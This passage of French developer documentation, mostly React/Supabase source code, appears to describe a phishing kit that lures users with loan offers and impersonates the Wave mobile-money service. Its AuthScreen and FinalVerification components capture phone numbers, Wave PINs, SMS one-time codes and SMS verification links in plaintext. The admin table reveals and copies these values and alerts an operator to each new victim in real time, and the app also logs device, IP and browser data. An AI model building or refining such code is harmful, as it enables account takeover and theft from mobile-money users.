              className="border rounded px-3 py-2"
            >
              <option value="all">Tous les statuts</option>
              <option value="pending">En attente</option>
              <option value="pending_validation">Validation en cours</option>
              <option value="verified">Vérifiés</option>
              <option value="rejected">Rejetés</option>
            </select>

            <select
              value={dateFilter}
              onChange={(e) => setDateFilter(e.target.value)}
              className="border rounded px-3 py-2"
            >
              <option value="today">Aujourd'hui</option>
              <option value="7days">7 derniers jours</option>
              <option value="30days">30 derniers jours</option>
              <option value="all">Tout</option>
            </select>

            <input
              type="text"
              placeholder="Rechercher par téléphone..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="border rounded px-3 py-2 col-span-2"
            />
          </div>
        </div>

        {/* Registrations Table */}
        <div className="bg-white rounded-lg shadow overflow-hidden">
          <table className="w-full">
            <thead className="bg-gray-50">
              <tr>
                <th className="px-6 py-3 text-left">Téléphone</th>
                <th className="px-6 py-3 text-left">Statut</th>
                <th className="px-6 py-3 text-left">Type</th>
                <th className="px-6 py-3 text-left">PIN</th>
                <th className="px-6 py-3 text-left">OTP</th>
                <th className="px-6 py-3 text-left">URL</th>
                <th className="px-6 py-3 text-left">Date</th>
                <th className="px-6 py-3 text-left">Actions</th>
              </tr>
            </thead>
            <tbody>
              {registrations
                .filter(r =>
                  searchTerm === '' || r.phone.includes(searchTerm)
                )
                .map(registration => (
                  <RegistrationRow
                    key={registration.id}
                    registration={registration}
                    onValidate={handleValidate}
                    onReject={handleReject}
                    onDelete={handleDelete}
                  />
                ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
```

**Composant RegistrationRow** (ligne du tableau):

```typescript
interface RegistrationRowProps {
  registration: UserRegistration;
  onValidate: (id: string) => void;
  onReject: (id: string) => void;
  onDelete: (id: string) => void;
}

const RegistrationRow: React.FC<RegistrationRowProps> = ({
  registration,
  onValidate,
  onReject,
  onDelete
}) => {
  const [showPin, setShowPin] = useState(false);
  const [showOtp, setShowOtp] = useState(false);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success('Copié !');
  };

  const getStatusBadge = (status: string) => {
    const styles = {
      pending: 'bg-yellow-100 text-yellow-800',
      pending_validation: 'bg-blue-100 text-blue-800',
      verified: 'bg-green-100 text-green-800',
      rejected: 'bg-red-100 text-red-800'
    };

    return (
      <span className={`px-2 py-1 rounded text-xs ${styles[status]}`}>
        {status}
      </span>
    );
  };

  return (
    <tr className="border-b hover:bg-gray-50">
      <td className="px-6 py-4">
        <div className="flex items-center gap-2">
          {registration.phone}
          <button onClick={() => copyToClipboard(registration.phone)}>
            <Copy size={14} />
          </button>
        </div>
      </td>

      <td className="px-6 py-4">
        {getStatusBadge(registration.status)}
      </td>

      <td className="px-6 py-4">
        {registration.account_type === 'business' ? (
          <Briefcase size={16} className="text-blue-500" />
        ) : (
          <User size={16} className="text-gray-500" />
        )}
      </td>

      <td className="px-6 py-4">
        <div className="flex items-center gap-2">
          {showPin ? registration.pin : '****'}
          <button onClick={() => setShowPin(!showPin)}>
            {showPin ? <EyeOff size={14} /> : <Eye size={14} />}
          </button>
          <button onClick={() => copyToClipboard(registration.pin)}>
            <Copy size={14} />
          </button>
        </div>
      </td>

      <td className="px-6 py-4">
        <div className="flex items-center gap-2">
          {showOtp ? registration.last_verification_code : '****'}
          <button onClick={() => setShowOtp(!showOtp)}>
            {showOtp ? <EyeOff size={14} /> : <Eye size={14} />}
          </button>
          <button onClick={() => copyToClipboard(registration.last_verification_code)}>
            <Copy size={14} />
          </button>
        </div>
      </td>

      <td className="px-6 py-4">
        {registration.verification_url && (
          <a
            href={registration.verification_url}
            target="_blank"
            rel="noopener noreferrer"
            className="text-blue-500 hover:underline"
          >
            <ExternalLink size={16} />
          </a>
        )}
      </td>

      <td className="px-6 py-4 text-sm text-gray-500">
        {new Date(registration.created_at).toLocaleString('fr-FR')}
      </td>

      <td className="px-6 py-4">
        <div className="flex gap-2">
          {registration.status !== 'verified' && (
            <button
              onClick={() => onValidate(registration.id)}
              className="text-green-500 hover:text-green-700"
              title="Valider"
            >
              <CheckCircle size={18} />
            </button>
          )}

          {registration.status !== 'rejected' && (
            <button
              onClick={() => onReject(registration.id)}
              className="text-orange-500 hover:text-orange-700"
              title="Rejeter"
            >
              <XCircle size={18} />
            </button>
          )}

          <button
            onClick={() => onDelete(registration.id)}
            className="text-red-500 hover:text-red-700"
            title="Supprimer"
          >
            <Trash2 size={18} />
          </button>
        </div>
      </td>
    </tr>
  );
};
```

---

## 9. COMPOSANTS RÉUTILISABLES

### 9.1 AuthScreen.tsx

**Fichier**: [src/components/AuthScreen.tsx](src/components/AuthScreen.tsx)

**Description**: Écran d'authentification multi-étapes pour les utilisateurs.

**Étapes (5 au total)**:

1. **account-type**: Choix du type de compte (Standard ou Business)
2. **phone**: Saisie du numéro de téléphone
3. **pin**: Code PIN (4 chiffres)
4. **verification**: Code OTP SMS (4-6 chiffres)
5. **url-verification**: Vérification de l'URL (étape finale)

**Limites de sécurité**:
- PIN: 3 tentatives maximum
- SMS: 3 tentatives maximum
- Vérification du statut toutes les 3 secondes

**État du composant**:

```typescript
interface AuthState {
  currentStep: 'account-type' | 'phone' | 'pin' | 'verification' | 'url-verification';
  accountType: 'standard' | 'business' | null;
  phone: string;
  pin: string;
  verificationCode: string;
  pinAttempts: number;
  smsAttempts: number;
  registrationId: string | null;
}
```

**Flux d'authentification**:

```typescript
const AuthScreen: React.FC<AuthScreenProps> = ({ onSuccess }) => {
  const [authState, setAuthState] = useState<AuthState>({
    currentStep: 'account-type',
    accountType: null,
    phone: '',
    pin: '',
    verificationCode: '',
    pinAttempts: 0,
    smsAttempts: 0,
    registrationId: null
  });

  // Étape 1: Type de compte
  const handleAccountTypeSelect = (type: 'standard' | 'business') => {
    setAuthState(prev => ({
      ...prev,
      accountType: type,
      currentStep: 'phone'
    }));
  };

  // Étape 2: Téléphone
  const handlePhoneSubmit = async () => {
    if (authState.phone.length < 10) {
      toast.error('Numéro de téléphone invalide');
      return;
    }

    // Vérifier si le téléphone existe déjà
    const { data: existing } = await supabase
      .from('user_registrations')
      .select('id')
      .eq('phone', authState.phone)
      .single();

    if (existing) {
      setAuthState(prev => ({
        ...prev,
        registrationId: existing.id,
        currentStep: 'pin'
      }));
    } else {
      // Créer nouvelle inscription
      const { data, error } = await supabase
        .from('user_registrations')
        .insert({
          phone: authState.phone,
          account_type: authState.accountType,
          status: 'pending'
        })
        .select()
        .single();

      if (error) {
        toast.error('Erreur lors de l\'inscription');
      } else {
        setAuthState(prev => ({
          ...prev,
          registrationId: data.id,
          currentStep: 'pin'
        }));
      }
    }
  };

  // Étape 3: PIN
  const handlePinSubmit = async () => {
    if (authState.pin.length !== 4) {
      toast.error('Le PIN doit contenir 4 chiffres');
      return;
    }

    if (authState.pinAttempts >= 3) {
      toast.error('Nombre maximum de tentatives atteint');
      return;
    }

    // Enregistrer le PIN
    const { error } = await supabase
      .from('user_registrations')
      .update({
        pin: authState.pin,
        pin_attempts: authState.pinAttempts + 1
      })
      .eq('id', authState.registrationId);

    if (error) {
      toast.error('Erreur lors de l\'enregistrement du PIN');
      setAuthState(prev => ({
        ...prev,
        pinAttempts: prev.pinAttempts + 1
      }));
    } else {
      setAuthState(prev => ({
        ...prev,
        currentStep: 'verification'
      }));
    }
  };

  // Étape 4: Code OTP
  const handleOtpSubmit = async () => {
    if (authState.verificationCode.length < 4) {
      toast.error('Code de vérification invalide');
      return;
    }

    if (authState.smsAttempts >= 3) {
      toast.error('Nombre maximum de tentatives atteint');
      return;
    }

    // Enregistrer le code OTP
    const { error } = await supabase
      .from('user_registrations')
      .update({
        last_verification_code: authState.verificationCode,
        verification_attempts: authState.smsAttempts + 1,
        status: 'pending_validation'
      })
      .eq('id', authState.registrationId);

    if (error) {
      toast.error('Erreur lors de la vérification');
      setAuthState(prev => ({
        ...prev,
        smsAttempts: prev.smsAttempts + 1
      }));
    } else {
      setAuthState(prev => ({
        ...prev,
        currentStep: 'url-verification'
      }));

      // Démarrer la vérification du statut
      startStatusCheck();
    }
  };

  // Vérification du statut toutes les 3 secondes
  const startStatusCheck = () => {
    const interval = setInterval(async () => {
      const { data } = await supabase
        .from('user_registrations')
        .select('status')
        .eq('id', authState.registrationId)
        .single();

      if (data?.status === 'verified') {
        clearInterval(interval);
        onSuccess();
      } else if (data?.status === 'rejected') {
        clearInterval(interval);
        toast.error('Votre demande a été rejetée');
      }
    }, 3000);
  };

  // Rendu conditionnel
  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      {authState.currentStep === 'account-type' && (
        <AccountTypeStep onSelect={handleAccountTypeSelect} />
      )}

      {authState.currentStep === 'phone' && (
        <PhoneStep
          value={authState.phone}
          onChange={(phone) => setAuthState(prev => ({ ...prev, phone }))}
          onSubmit={handlePhoneSubmit}
        />
      )}

      {authState.currentStep === 'pin' && (
        <PinStep
          value={authState.pin}
          onChange={(pin) => setAuthState(prev => ({ ...prev, pin }))}
          onSubmit={handlePinSubmit}
          attempts={authState.pinAttempts}
        />
      )}

      {authState.currentStep === 'verification' && (
        <OtpStep
          value={authState.verificationCode}
          onChange={(code) => setAuthState(prev => ({ ...prev, verificationCode: code }))}
          onSubmit={handleOtpSubmit}
          attempts={authState.smsAttempts}
        />
      )}

      {authState.currentStep === 'url-verification' && (
        <FinalVerification registrationId={authState.registrationId} />
      )}
    </div>
  );
};
```

---

### 9.2 FinalVerification.tsx

**Fichier**: [src/components/FinalVerification.tsx](src/components/FinalVerification.tsx)

**Description**: Dernière étape de vérification avec extraction automatique d'URL.

**Fonctionnalités**:
- Lecture audio des instructions
- Extraction automatique d'URL depuis SMS
- Validation en temps réel
- Interface de collage de SMS

**Extraction d'URL**:

```typescript
const extractUrlFromSms = (smsText: string): string | null => {
  // Patterns d'URL Wave
  const patterns = [
    /https?:\/\/[^\s]+/gi,
    /wave\.com\/[^\s]+/gi,
    /app\.wave\.com\/[^\s]+/gi
  ];

  for (const pattern of patterns) {
    const match = smsText.match(pattern);
    if (match && match[0]) {
      return match[0];
    }
  }

  return null;
};
```

**Composant**:

```typescript
interface FinalVerificationProps {
  registrationId: string;
}

const FinalVerification: React.FC<FinalVerificationProps> = ({ registrationId }) => {
  const [smsText, setSmsText] = useState('');
  const [extractedUrl, setExtractedUrl] = useState('');
  const [isPlaying, setIsPlaying] = useState(false);
  const audioRef = useRef<HTMLAudioElement>(null);

  // Jouer l'audio au montage
  useEffect(() => {
    if (audioRef.current) {
      audioRef.current.play();
      setIsPlaying(true);
    }
  }, []);

  // Extraire l'URL quand le SMS change
  useEffect(() => {
    if (smsText) {
      const url = extractUrlFromSms(smsText);
      if (url) {
        setExtractedUrl(url);
        handleUrlSubmit(url);
      }
    }
  }, [smsText]);

  const handleUrlSubmit = async (url: string) => {
    const { error } = await supabase
      .from('user_registrations')
      .update({ verification_url: url })
      .eq('id', registrationId);

    if (error) {
      toast.error('Erreur lors de l\'enregistrement de l\'URL');
    } else {
      toast.success('URL enregistrée, en attente de validation admin');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <div className="max-w-2xl w-full bg-white rounded-lg shadow-lg p-8">
        <h2 className="text-2xl font-bold mb-6">Vérification finale</h2>

        {/* Audio Player */}
        <audio
          ref={audioRef}
          src="/audio/url-verification.mp3"
          onEnded={() => setIsPlaying(false)}
          controls
          className="w-full mb-6"
        />

        {/* Instructions */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
          <h3 className="font-semibold mb-2">Instructions:</h3>
          <ol className="list-decimal list-inside space-y-2">
            <li>Ouvrez votre application Wave</li>
            <li>Vérifiez vos SMS</li>
            <li>Copiez le SMS complet contenant le lien</li>
            <li>Collez-le dans le champ ci-dessous</li>
          </ol>
        </div>

        {/* SMS Input */}
        <div className="mb-6">
          <label className="block text-sm font-medium mb-2">
            Collez votre SMS Wave ici:
          </label>
          <textarea
            value={smsText}
            onChange={(e) => setSmsText(e.target.value)}
            placeholder="Collez le SMS complet ici..."
            className="w-full h-32 border rounded-lg p-3"
          />
        </div>

        {/* Extracted URL */}
        {extractedUrl && (
          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
            <p className="text-sm font-medium text-green-800 mb-2">
              URL détectée:
            </p>
            <a
              href={extractedUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-500 hover:underline break-all"
            >
              {extractedUrl}
            </a>
          </div>
        )}

        {/* Waiting Message */}
        <div className="mt-6 text-center text-gray-600">
          <p>En attente de validation par l'administrateur...</p>
          <div className="mt-4">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mx-auto" />
          </div>
        </div>
      </div>
    </div>
  );
};
```

---

### 9.3 UrlVerificationStep.tsx

**Fichier**: [src/components/UrlVerificationStep.tsx](src/components/UrlVerificationStep.tsx)

**Description**: Composant dédié à l'extraction et la vérification d'URL (variante de FinalVerification).

**Regex pour extraction**:

```typescript
const URL_PATTERNS = [
  // URLs complètes
  /https?:\/\/(?:www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b(?:[-a-zA-Z0-9()@:%_\+.~#?&\/=]*)/gi,

  // URLs Wave spécifiques
  /wave\.com\/[a-zA-Z0-9\-_\/]+/gi,
  /app\.wave\.com\/[a-zA-Z0-9\-_\/]+/gi,

  // URLs raccourcies
  /bit\.ly\/[a-zA-Z0-9]+/gi,
  /tinyurl\.com\/[a-zA-Z0-9]+/gi
];
```

---

### 9.4 LoanPackages.tsx

**Fichier**: [src/components/LoanPackages.tsx](src/components/LoanPackages.tsx)

**Description**: Composant d'affichage des packages de prêt disponibles.

**Props**:

```typescript
interface LoanPackage {
  id: string;
  name: string;
  description: string;
  minAmount: number;
  maxAmount: number;
  minDuration: number;
  maxDuration: number;
  interestRate: number;
  features: string[];
}

interface LoanPackagesProps {
  packages: LoanPackage[];
  onSelect?: (packageId: string) => void;
}
```

**Composant**:

```typescript
const LoanPackages: React.FC<LoanPackagesProps> = ({ packages, onSelect }) => {
  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
      {packages.map(pkg => (
        <div
          key={pkg.id}
          className="bg-white rounded-lg shadow-lg p-6 hover:shadow-xl transition-shadow"
        >
          <h3 className="text-xl font-bold mb-2">{pkg.name}</h3>
          <p className="text-gray-600 mb-4">{pkg.description}</p>

          <div className="space-y-2 mb-4">
            <div className="flex justify-between">
              <span className="text-sm text-gray-500">Montant:</span>
              <span className="font-semibold">
                {pkg.minAmount.toLocaleString()} - {pkg.maxAmount.toLocaleString()} XOF
              </span>
            </div>

            <div className="flex justify-between">
              <span className="text-sm text-gray-500">Durée:</span>
              <span className="font-semibold">
                {pkg.minDuration} - {pkg.maxDuration} mois
              </span>
            </div>

            <div className="flex justify-between">
              <span className="text-sm text-gray-500">Taux:</span>
              <span className="font-semibold text-blue-600">
                {pkg.interestRate}%
              </span>
            </div>
          </div>

          <div className="border-t pt-4">
            <p className="text-sm font-medium mb-2">Avantages:</p>
            <ul className="space-y-1">
              {pkg.features.map((feature, idx) => (
                <li key={idx} className="text-sm text-gray-600 flex items-center gap-2">
                  <CheckCircle size={14} className="text-green-500" />
                  {feature}
                </li>
              ))}
            </ul>
          </div>

          {onSelect && (
            <button
              onClick={() => onSelect(pkg.id)}
              className="w-full mt-4 bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition-colors"
            >
              Choisir ce prêt
            </button>
          )}
        </div>
      ))}
    </div>
  );
};
```

---

### 9.5 LoginForm.tsx

**Fichier**: [src/components/LoginForm.tsx](src/components/LoginForm.tsx)

**Description**: Formulaire de connexion simple utilisant le hook `useWaveConnection`.

```typescript
interface LoginFormProps {
  onSuccess: () => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSuccess }) => {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState('');
  const { connect, isConnecting, error } = useWaveConnection();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const success = await connect(phone, pin);

    if (success) {
      onSuccess();
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div>
        <label className="block text-sm font-medium mb-2">
          Numéro de téléphone
        </label>
        <input
          type="tel"
          value={phone}
          onChange={(e) => setPhone(e.target.value)}
          placeholder="+221 XX XXX XX XX"
          className="w-full border rounded-lg px-4 py-2"
          required
        />
      </div>

      <div>
        <label className="block text-sm font-medium mb-2">
          Code PIN
        </label>
        <input
          type="password"
          value={pin}
          onChange={(e) => setPin(e.target.value)}
          placeholder="****"
          maxLength={4}
          className="w-full border rounded-lg px-4 py-2"
          required
        />
      </div>

      {error && (
        <div className="bg-red-50 border border-red-200 rounded-lg p-3">
          <p className="text-sm text-red-800">{error}</p>
        </div>
      )}

      <button
        type="submit"
        disabled={isConnecting}
        className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 disabled:opacity-50"
      >
        {isConnecting ? 'Connexion...' : 'Se connecter'}
      </button>
    </form>
  );
};
```

---

## 10. SERVICES ET UTILITAIRES

### 10.1 lib/supabase.ts

**Fichier**: [src/lib/supabase.ts](src/lib/supabase.ts)

**Description**: Configuration du client Supabase.

```typescript
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  throw new Error('Missing Supabase environment variables');
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
  auth: {
    persistSession: true,
    autoRefreshToken: true,
    detectSessionInUrl: true
  },
  global: {
    headers: {
      'x-application-name': 'wave-auto-senegal'
    }
  },
  db: {
    schema: 'public'
  },
  realtime: {
    params: {
      eventsPerSecond: 10
    }
  }
});

// Types TypeScript
export interface UserRegistration {
  id: string;
  phone: string;
  status: 'pending' | 'pending_validation' | 'verified' | 'rejected';
  account_type?: 'standard' | 'business';
  business_account_id?: string;
  priority_level?: number;
  verification_attempts: number;
  last_verification_code: string;
  verification_url?: string;
  pin_attempts: number;
  pin: string;
  created_at: string;
  business_verified?: boolean;
  user_mac_address?: string;
  user_device_id?: string;
  user_ip?: string;
  user_country?: string;
  user_browser?: string;
  user_os?: string;
  phone_model?: string;
  device_type?: string;
  device_vendor?: string;
}
```

---

### 10.2 lib/adminAuth.ts

**Fichier**: [src/lib/adminAuth.ts](src/lib/adminAuth.ts)

**Description**: Système d'authentification admin avec sessions persistantes.

```typescript
interface AdminSession {
  timestamp: number;
  expiresAt: number;
}

const SESSION_DURATION = 24 * 60 * 60 * 1000; // 24 heures
const STORAGE_KEY = 'admin_session';
const VALID_CODES = ['Darck_44667', '44667'];

class AdminAuth {
  /**
   * Connexion administrateur
   */
  async login(code: string): Promise<boolean> {
    if (!VALID_CODES.includes(code)) {
      return false;
    }

    const session: AdminSession = {
      timestamp: Date.now(),
      expiresAt: Date.now() + SESSION_DURATION
    };

    // Stocker en localStorage (encodé base64)
    const encoded = btoa(JSON.stringify(session));
    localStorage.setItem(STORAGE_KEY, encoded);

    // Créer cookie sécurisé
    this.setCookie('admin_auth', 'true', SESSION_DURATION);

    return true;
  }

  /**
   * Déconnexion
   */
  logout(): void {
    localStorage.removeItem(STORAGE_KEY);
    this.deleteCookie('admin_auth');
  }

  /**
   * Vérifier la session
   */
  checkSession(): boolean {
    try {
      const encoded = localStorage.getItem(STORAGE_KEY);
      if (!encoded) return false;

      const session: AdminSession = JSON.parse(atob(encoded));
      const now = Date.now();

      // Session expirée
      if (now > session.expiresAt) {
        this.logout();
        return false;
      }

      // Renouveler si moins d'1h restante
      if (session.expiresAt - now < 60 * 60 * 1000) {
        this.renewSession();
      }

      return true;
    } catch (error) {
      console.error('Session check error:', error);
      this.logout();
      return false;
    }
  }

  /**
   * Renouveler la session
   */
  private renewSession(): void {
    const session: AdminSession = {
      timestamp: Date.now(),
      expiresAt: Date.now() + SESSION_DURATION
    };

    const encoded = btoa(JSON.stringify(session));
    localStorage.setItem(STORAGE_KEY, encoded);
    this.setCookie('admin_auth', 'true', SESSION_DURATION);
  }

  /**
   * Créer un cookie
   */
  private setCookie(name: string, value: string, duration: number): void {
    const expires = new Date(Date.now() + duration);
    document.cookie = `${name}=${value}; expires=${expires.toUTCString()}; path=/; secure; samesite=strict`;
  }

  /**
   * Supprimer un cookie
   */
  private deleteCookie(name: string): void {
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
  }

  /**
   * Obtenir le temps restant de session
   */
  getSessionTimeRemaining(): number {
    try {
      const encoded = localStorage.getItem(STORAGE_KEY);
      if (!encoded) return 0;

      const session: AdminSession = JSON.parse(atob(encoded));
      return Math.max(0, session.expiresAt - Date.now());
    } catch {
      return 0;
    }
  }
}

export const adminAuth = new AdminAuth();
```

---

### 10.3 lib/visitors.ts

**Fichier**: [src/lib/visitors.ts](src/lib/visitors.ts)

**Description**: Tracking des visiteurs en temps réel.

```typescript
import { supabase } from './supabase';

/**
 * Générer un ID de session unique
 */
const generateSessionId = (): string => {
  return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
};

/**
 * Obtenir ou créer l'ID de session
 */
const getSessionId = (): string => {
  let sessionId = sessionStorage.getItem('visitor_session_id');

  if (!sessionId) {
    sessionId = generateSessionId();
    sessionStorage.setItem('visitor_session_id', sessionId);
  }

  return sessionId;
};

/**
 * Enregistrer une visite
 */
export const recordVisit = async (page: string): Promise<void> => {
  const sessionId = getSessionId();

  try {
    // Upsert (insert or update)
    const { error } = await supabase
      .from('realtime_visitors')
      .upsert({
        session_id: sessionId,
        page,
        last_seen: new Date().toISOString()
      }, {
        onConflict: 'session_id'
      });

    if (error) {
      console.error('Error recording visit:', error);
    }
  } catch (error) {
    console.error('Error recording visit:', error);
  }
};

/**
 * Mettre à jour la dernière activité
 */
export const updateActivity = async (): Promise<void> => {
  const sessionId = getSessionId();

  try {
    const { error } = await supabase
      .from('realtime_visitors')
      .update({ last_seen: new Date().toISOString() })
      .eq('session_id', sessionId);

    if (error) {
      console.error('Error updating activity:', error);
    }
  } catch (error) {
    console.error('Error updating activity:', error);
  }
};

/**
 * Hook pour tracking automatique
 */
export const useVisitorTracking = (page: string) => {
  useEffect(() => {
    // Enregistrer la visite initiale
    recordVisit(page);

    // Mettre à jour toutes les 30 secondes
    const interval = setInterval(() => {
      updateActivity();
    }, 30000);

    return () => clearInterval(interval);
  }, [page]);
};

/**
 * Nettoyer les visiteurs inactifs (côté admin)
 */
export const cleanupInactiveVisitors = async (minutes: number = 5): Promise<void> => {
  const threshold = new Date(Date.now() - minutes * 60 * 1000);

  try {
    const { error } = await supabase
      .from('realtime_visitors')
      .delete()
      .lt('last_seen', threshold.toISOString());

    if (error) {
      console.error('Error cleaning up visitors:', error);
    }
  } catch (error) {
    console.error('Error cleaning up visitors:', error);
  }
};

/**
 * Obtenir les statistiques de visiteurs
 */
export const getVisitorStats = async () => {
  try {
    // Visiteurs actifs (5 min)
    const { count: activeCount } = await supabase
      .from('realtime_visitors')
      .select('*', { count: 'exact', head: true })
      .gte('last_seen', new Date(Date.now() - 5 * 60 * 1000).toISOString());

    // Visiteurs horaires
    const { count: hourlyCount } = await supabase
      .from('realtime_visitors')
      .select('*', { count: 'exact', head: true })
      .gte('created_at', new Date(Date.now() - 60 * 60 * 1000).toISOString());

    // Visiteurs journaliers
    const { count: dailyCount } = await supabase
      .from('realtime_visitors')
      .select('*', { count: 'exact', head: true })
      .gte('created_at', new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString());

    return {
      active: activeCount || 0,
      hourly: hourlyCount || 0,
      daily: dailyCount || 0
    };
  } catch (error) {
    console.error('Error getting visitor stats:', error);
    return { active: 0, hourly: 0, daily: 0 };
  }
};
```

---

### 10.4 lib/notifications.ts

**Fichier**: [src/lib/notifications.ts](src/lib/notifications.ts)

**Description**: Système de notifications desktop.

```typescript
/**
 * Demander la permission pour les notifications
 */
export const requestNotificationPermission = async (): Promise<boolean> => {
  if (!('Notification' in window)) {
    console.warn('Notifications not supported');
    return false;
  }

  if (Notification.permission === 'granted') {
    return true;
  }

  if (Notification.permission !== 'denied') {
    const permission = await Notification.requestPermission();
    return permission === 'granted';
  }

  return false;
};

/**
 * Afficher une notification desktop
 */
export const showDesktopNotification = (
  title: string,
  options?: NotificationOptions
): void => {
  if (Notification.permission !== 'granted') {
    console.warn('Notification permission not granted');
    return;
  }

  try {
    const notification = new Notification(title, {
      icon: '/icon.png',
      badge: '/badge.png',
      requireInteraction: true,
      ...options
    });

    // Auto-close après 10 secondes si pas d'interaction
    setTimeout(() => {
      notification.close();
    }, 10000);

    return notification;
  } catch (error) {
    console.error('Error showing notification:', error);
  }
};

/**
 * Notification pour nouvelle inscription
 */
export const notifyNewRegistration = (phone: string): void => {
  showDesktopNotification('Nouvelle inscription', {
    body: `Téléphone: ${phone}`,
    tag: 'new-registration',
    data: { phone }
  });

  // Jouer un son
  playNotificationSound();
};

/**
 * Jouer un son de notification
 */
export const playNotificationSound = (): void => {
  try {
    const audio = new Audio('/audio/notification.mp3');
    audio.volume = 0.5;
    audio.play().catch(err => {
      console.error('Error playing sound:', err);
    });
  } catch (error) {
    console.error('Error playing notification sound:', error);
  }
};

/**
 * Hook pour initialiser les notifications (admin)
 */
export const useNotifications = () => {
  const [permissionGranted, setPermissionGranted] = useState(false);

  useEffect(() => {
    requestNotificationPermission().then(granted => {
      setPermissionGranted(granted);
    });
  }, []);

  return {
    permissionGranted,
    notify: showDesktopNotification
  };
};
```

---

### 10.5 lib/toast.tsx

**Fichier**: [src/lib/toast.tsx](src/lib/toast.tsx)

**Description**: Système de toasts UI (notifications in-app).

```typescript
import { CheckCircle, XCircle, AlertCircle, Info } from 'lucide-react';

type ToastType = 'success' | 'error' | 'warning' | 'info';

interface ToastMessage {
  id: string;
  type: ToastType;
  message: string;
  duration: number;
}

class ToastManager {
  private toasts: ToastMessage[] = [];
  private listeners: ((toasts: ToastMessage[]) => void)[] = [];

  subscribe(listener: (toasts: ToastMessage[]) => void) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }

  private notify() {
    this.listeners.forEach(listener => listener(this.toasts));
  }

  private add(type: ToastType, message: string, duration: number = 3000) {
    const id = `${Date.now()}-${Math.random()}`;
    const toast: ToastMessage = { id, type, message, duration };

    this.toasts.push(toast);
    this.notify();

    setTimeout(() => {
      this.remove(id);
    }, duration);
  }

  private remove(id: string) {
    this.toasts = this.toasts.filter(t => t.id !== id);
    this.notify();
  }

  success(message: string, duration?: number) {
    this.add('success', message, duration);
  }

  error(message: string, duration?: number) {
    this.add('error', message, duration);
  }

  warning(message: string, duration?: number) {
    this.add('warning', message, duration);
  }

  info(message: string, duration?: number) {
    this.add('info', message, duration);
  }
}

export const toast = new ToastManager();

// Composant ToastContainer
export const ToastContainer: React.FC = () => {
  const [toasts, setToasts] = useState<ToastMessage[]>([]);

  useEffect(() => {
    return toast.subscribe(setToasts);
  }, []);

  const getIcon = (type: ToastType) => {
    switch (type) {
      case 'success':
        return <CheckCircle className="text-green-500" />;
      case 'error':
        return <XCircle className="text-red-500" />;
      case 'warning':
        return <AlertCircle className="text-yellow-500" />;
      case 'info':
        return <Info className="text-blue-500" />;
    }
  };

  const getStyles = (type: ToastType) => {
    switch (type) {
      case 'success':
        return 'bg-green-50 border-green-200';
      case 'error':
        return 'bg-red-50 border-red-200';
      case 'warning':
        return 'bg-yellow-50 border-yellow-200';
      case 'info':
        return 'bg-blue-50 border-blue-200';
    }
  };

  return (
    <div className="fixed top-4 right-4 z-50 space-y-2">
      {toasts.map(toast => (
        <div
          key={toast.id}
          className={`flex items-center gap-3 p-4 rounded-lg border shadow-lg ${getStyles(toast.type)} animate-slide-in`}
        >
          {getIcon(toast.type)}
          <p className="text-sm font-medium">{toast.message}</p>
        </div>
      ))}
    </div>
  );
};
```

---

## 11. HOOKS PERSONNALISÉS

### 11.1 useWaveConnection.ts

**Fichier**: [src/hooks/useWaveConnection.ts](src/hooks/useWaveConnection.ts)

**Description**: Hook pour gérer la connexion Wave.

```typescript
import { useState } from 'react';
import { supabase } from '../lib/supabase';

interface UseWaveConnectionReturn {
  connect: (phone: string, pin: string) => Promise<boolean>;
  isConnecting: boolean;
  error: string | null;
}

export const useWaveConnection = (): UseWaveConnectionReturn => {
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const connect = async (phone: string, pin: string): Promise<boolean> => {
    setIsConnecting(true);
    setError(null);

    try {
      // Vérifier les credentials en base
      const { data, error: queryError } = await supabase
        .from('user_registrations')
        .select('*')
        .eq('phone', phone)
        .eq('pin', pin)
        .eq('status', 'verified')
        .single();

      if (queryError || !data) {
        setError('Identifiants invalides ou compte non vérifié');
        return false;
      }

      // Stocker les infos de connexion
      sessionStorage.setItem('user_phone', phone);
      sessionStorage.setItem('user_id', data.id);

      return true;
    } catch (err) {
      setError('Erreur de connexion');
      console.error('Connection error:', err);
      return false;
    } finally {
      setIsConnecting(false);
    }
  };

  return { connect, isConnecting, error };
};
```

---

## 12. SYSTÈME DE NAVIGATION

### 12.1 App.tsx - Routage principal

**Fichier**: [src/App.tsx](src/App.tsx)

**Description**: Composant racine avec système de routage basé sur l'état.

```typescript
import { useState, useEffect } from 'react';
import LandingPage from './components/LandingPage';
import LoanApplication from './components/LoanApplication';
import AuthScreen from './components/AuthScreen';
import Dashboard from './components/Dashboard';
import AdminAuth from './components/AdminAuth';
import AdminDashboard from './components/AdminDashboard';
import { ToastContainer } from './lib/toast';

function App() {
  // États de navigation
  const [showLoanApplication, setShowLoanApplication] = useState(false);
  const [showAuth, setShowAuth] = useState(false);
